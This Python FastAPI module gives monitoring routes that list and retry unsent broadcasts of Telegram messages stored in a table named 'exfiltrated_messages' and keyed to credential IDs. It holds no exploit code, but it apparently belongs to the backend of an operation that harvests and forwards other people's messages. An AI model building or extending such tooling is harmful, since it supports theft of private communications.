"""Monitor broadcasts resource routes."""

from .common import *

router = APIRouter()

@router.get("/broadcasts/pending")
def list_pending_broadcasts(limit: int = 100, failed_only: bool = False):
    """List unbroadcasted messages and retry metadata for operator triage."""
    limit = max(1, min(limit, 1000))
    columns = (
        "id, credential_id, telegram_msg_id, sender_name, media_type, "
        "is_broadcasted, broadcast_error, broadcast_attempts, next_retry_at, "
        "broadcast_claimed_at, created_at"
    )
    legacy_columns = (
        "id, credential_id, telegram_msg_id, sender_name, media_type, "
        "is_broadcasted, broadcast_claimed_at, created_at"
    )
    try:
        query = (
            db.table("exfiltrated_messages")
            .select(columns)
            .eq("is_broadcasted", False)
        )
        if failed_only:
            query = query.not_.is_("broadcast_error", "null")
        res = query.order("created_at", desc=False).limit(limit).execute()
        return {
            "status": "ok",
            "schema": "broadcast_reliability",
            "messages": res.data or [],
        }
    except Exception as exc:
        text = str(exc).lower()
        if not any(
            column in text
            for column in ("broadcast_error", "broadcast_attempts", "next_retry_at")
        ):
            logger.exception("monitor/broadcasts/pending query failed")
            raise HTTPException(status_code=500, detail="Internal error") from exc

        if failed_only:
            return {
                "status": "schema_missing",
                "schema": "legacy",
                "messages": [],
                "warning": "broadcast reliability columns are not available",
            }
        try:
            res = (
                db.table("exfiltrated_messages")
                .select(legacy_columns)
                .eq("is_broadcasted", False)
                .order("created_at", desc=False)
                .limit(limit)
                .execute()
            )
            return {
                "status": "ok",
                "schema": "legacy",
                "messages": res.data or [],
                "warning": "broadcast reliability columns are not available",
            }
        except Exception as fallback_exc:
            logger.exception("monitor/broadcasts/pending legacy query failed")
            raise HTTPException(status_code=500, detail="Internal error") from fallback_exc

@router.post("/broadcasts/{message_id}/retry")
def retry_pending_broadcast(message_id: str):
    """Clear retry delay/claim for one unbroadcasted message and dispatch broadcaster."""
    try:
        res = (
            db.table("exfiltrated_messages")
            .update({"broadcast_claimed_at": None, "next_retry_at": None})
            .eq("id", message_id)
            .eq("is_broadcasted", False)
            .execute()
        )
    except Exception as exc:
        text = str(exc).lower()
        if "next_retry_at" not in text:
            logger.exception("monitor/broadcasts retry update failed")
            raise HTTPException(status_code=500, detail="Internal error") from exc
        try:
            res = (
                db.table("exfiltrated_messages")
                .update({"broadcast_claimed_at": None})
                .eq("id", message_id)
                .eq("is_broadcasted", False)
                .execute()
            )
        except Exception as fallback_exc:
            logger.exception("monitor/broadcasts retry legacy update failed")
            raise HTTPException(status_code=500, detail="Internal error") from fallback_exc

    rows = res.data or []
    if not rows:
        raise HTTPException(status_code=404, detail="unbroadcasted message not found")
    row = rows[0]

    dispatched = False
    try:
        from app.workers.celery_app import app as celery_app

        celery_app.send_task("flow.broadcast_pending")
        dispatched = True
    except Exception as exc:
        logger.warning("failed to dispatch broadcast retry task: %s", exc)

    AuditLogger.log(
        AuditEvent.BROADCAST_RETRY_REQUESTED,
        credential_id=row.get("credential_id"),
        user="monitor_api",
        details={
            "message_id": message_id,
            "broadcast_dispatched": dispatched,
            "mode": "single",
        },
    )

    return {
        "status": "ok",
        "message_id": message_id,
        "updated": True,
        "broadcast_dispatched": dispatched,
    }
